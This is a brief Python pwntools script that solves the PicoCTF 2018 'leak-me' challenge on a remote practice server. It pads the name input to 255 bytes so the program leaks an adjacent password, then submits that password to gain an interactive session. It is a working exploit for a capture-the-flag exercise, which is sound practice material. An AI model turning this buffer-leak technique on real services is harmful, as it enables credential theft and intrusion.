from pwn import *


p = remote("node4.buuoj.cn", 29709)
# p = process("./PicoCTF_2018_leak-me")

# context.log_level = "debug"


# fgets(buf, 256, stdin) --> read 255 bytes
pad = "a"*255
p.sendafter("What is your name?", pad)

p.recvuntil(",")
passwd = p.recvuntil("\n", drop=True)
p.sendline(passwd)

p.interactive()


